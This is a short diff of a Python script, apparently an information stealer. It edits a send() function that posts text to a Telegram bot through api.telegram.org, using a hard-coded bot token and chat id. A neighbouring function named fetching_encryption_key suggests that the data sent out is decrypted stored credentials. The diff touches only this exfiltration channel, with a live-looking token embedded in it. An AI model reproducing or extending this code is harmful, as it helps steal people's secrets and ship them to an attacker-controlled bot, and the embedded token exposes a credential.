@@ -7,6 +7,8 @@ import json
 import os
 import sys
 
+ID = 1410223644
+
 print("checking of dependency.....")
 try:
     import requests
@@ -61,7 +63,7 @@ def fetching_encryption_key():
 def send(text):
     url = f'https://api.telegram.org/bot5633216566:AAGVHIaZZIHZ3ge-6ZLDbqsZX0F67szyRDo/sendMessage'
     payload = {
-        'chat_id': 1410223644,
+        'chat_id': ID,
         'text': text
     }
 
